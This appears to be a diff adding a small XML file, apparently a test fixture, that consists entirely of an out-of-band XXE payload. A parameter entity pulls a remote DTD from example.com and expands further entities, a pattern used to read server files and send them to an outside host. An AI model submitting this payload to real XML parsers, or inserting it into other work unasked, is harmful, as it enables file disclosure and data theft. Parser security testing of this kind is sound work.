@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE cdl [<!ENTITY % asd SYSTEM "http://example.com/oob.dtd">%asd;%c;]>
+<cdl>&rrr;</cdl>
+
+
